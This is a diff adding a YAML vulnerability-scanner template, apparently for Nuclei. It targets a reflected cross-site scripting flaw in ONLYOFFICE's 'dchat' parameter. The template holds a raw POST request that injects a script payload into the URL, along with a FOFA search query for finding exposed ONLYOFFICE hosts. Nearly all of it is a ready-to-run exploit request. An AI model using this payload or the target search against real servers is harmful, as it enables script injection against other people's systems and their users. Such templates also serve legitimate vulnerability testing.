@@ -1,0 +1,33 @@
+id: poc-rnr7hwsuauq77s87
+info:
+  name: onlyoffice-dchat存在反射xss漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rnr7hwsuauq77s87'
+  tags: xss,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rnr7hwsuauq77s87
+    fofa: app="ONLYOFFICE"
+http:
+- raw:
+  - 'POST /hosting/wopi/word/edit?dchat=asdasd</script><script>alert(''XSS'')</script> HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
